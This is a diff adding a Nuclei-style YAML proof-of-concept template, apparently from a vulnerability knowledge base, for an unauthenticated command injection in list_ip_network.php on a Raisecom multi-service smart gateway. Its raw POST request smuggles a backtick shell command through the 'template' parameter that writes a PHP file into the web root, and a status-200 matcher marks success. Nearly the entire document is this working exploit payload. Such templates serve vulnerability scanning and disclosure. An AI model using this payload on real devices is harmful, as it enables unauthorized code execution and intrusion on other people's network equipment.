@@ -1,0 +1,30 @@
+id: poc-feptroguf2k55u7w
+info:
+  name: 瑞斯康达多业务智能网关多个版本list_ip_network.php存在未授权命令注入
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/feptroguf2k55u7w'
+  tags: rce,unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: feptroguf2k55u7w
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /vpn/list_ip_network.php?template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2Finfo27.php%60 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 111
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+
+    Nradius_submit=true'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
